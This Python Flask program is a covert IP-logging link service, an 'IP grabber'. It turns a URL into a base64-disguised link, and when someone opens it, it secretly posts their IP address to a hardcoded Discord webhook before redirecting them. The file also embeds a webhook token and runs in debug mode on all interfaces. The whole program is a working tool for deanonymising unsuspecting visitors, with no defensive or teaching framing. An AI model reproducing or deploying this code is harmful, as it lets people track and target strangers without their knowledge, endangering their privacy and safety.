from flask import Flask, request, render_template, redirect
import base64
import requests

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1309069615720304710/eDA942h2neR0LEtp_PRNbT-keSdQDFNy7pYnK39fVuKTHRvWNsvr3bkE1u6kWQtm1Tbu"

def encode_url(original_url):
    encoded = base64.urlsafe_b64encode(original_url.encode()).decode()
    padding = '=' * (4 - len(encoded) % 4)
    return encoded + padding

def decode_url(encoded_url):
    missing_padding = len(encoded_url) % 4
    if missing_padding:
        encoded_url += '=' * (4 - missing_padding)
    decoded = base64.urlsafe_b64decode(encoded_url.encode()).decode()
    return decoded

def send_to_discord(ip_address, original_url):
    message = {
        "content": f"IP Address Logged: {ip_address}\nRedirected to: {original_url}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=message)
    if response.status_code != 204:
        print(f"Failed to send IP to Discord. Status Code: {response.status_code}")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        original_url = request.form['url']
        encoded_link = encode_url(original_url)
        full_link = request.host_url + encoded_link
        return render_template('index.html', encoded_link=encoded_link, full_link=full_link)
    return render_template('index.html')

@app.route('/<encoded_link>', methods=['GET'])
def capture_ip(encoded_link):
    original_url = decode_url(encoded_link)
    user_ip = request.remote_addr
    send_to_discord(user_ip, original_url)
    return redirect(original_url)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
